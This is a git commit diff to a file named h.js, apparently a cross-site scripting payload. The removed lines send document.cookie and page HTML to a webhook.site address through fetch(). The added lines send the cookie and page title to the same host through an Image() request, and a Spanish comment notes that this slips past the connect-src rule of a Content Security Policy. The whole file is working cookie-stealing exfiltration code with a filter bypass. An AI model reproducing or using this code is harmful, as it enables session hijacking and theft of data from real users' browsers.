0afa303dcf0c65d2297fa4fef1f43db3f1e594de
Hynpbus <iancruzh@gmail.com>
2026-03-27 21:34:01 -0400

    h addition with html 2 como imagen

--- h.js
+++ h.js
@@ -1,3 +1,5 @@
-fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + 
-  encodeURIComponent(document.cookie) +
-  '&h=' + encodeURIComponent(document.documentElement.innerHTML.substring(0,5000)));
+// Usar Image() para exfiltrar - no usa connect-src
+var data = encodeURIComponent(document.cookie + '|||' + document.title);
+var img = new Image();
+img.src = 'https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + data;
+document.body.appendChild(img);
